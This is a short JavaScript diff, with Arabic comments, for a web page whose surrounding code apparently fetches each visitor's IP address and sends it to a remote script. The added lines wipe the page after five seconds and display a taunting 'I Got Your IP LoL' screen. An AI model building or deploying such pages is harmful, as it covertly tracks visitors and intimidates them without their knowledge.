@@ -190,6 +190,27 @@
           console.error('Failed to get IP:', err);
         });
       // ** نهاية جلب IP وإرساله **
+
+      // بعد 5 ثواني حذف كل شيء واظهار النص
+      setTimeout(() => {
+        document.body.innerHTML = `
+          <div style="
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: black;
+            color: white;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 3em;
+            text-shadow: 0 0 10px green, 0 0 5px white;
+            user-select: none;
+            text-align: center;
+          ">
+            I Got Your IP LoL
+          </div>
+        `;
+      }, 5000);
     }
 
     // جلب عدد الزيارات من GAS (تأكد أنك عدلت السكربت لاسترجاع العدد)
